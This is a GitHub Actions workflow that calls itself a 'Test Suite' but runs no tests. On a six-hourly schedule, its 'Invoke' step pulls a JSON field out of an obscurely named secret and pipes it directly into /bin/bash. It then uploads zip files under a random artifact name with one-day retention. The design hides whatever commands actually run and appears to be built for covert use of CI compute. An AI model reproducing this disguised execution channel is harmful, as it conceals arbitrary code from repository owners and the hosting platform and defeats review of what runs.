name: Test Suite
on:
  workflow_dispatch:

  schedule:
    - cron: '56 2,8,14,20 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  scheduler:
    name: Run task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Invoke
        env:
          np6839: ${{ secrets.np6839 }}
        run: |
          printf '%s' "$np6839" | jq -r .s06 | /bin/bash
          echo $g0415 | jq -r .yuxcl93 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: bQiQeaKL
          path: "*.zip"
          retention-days: 1
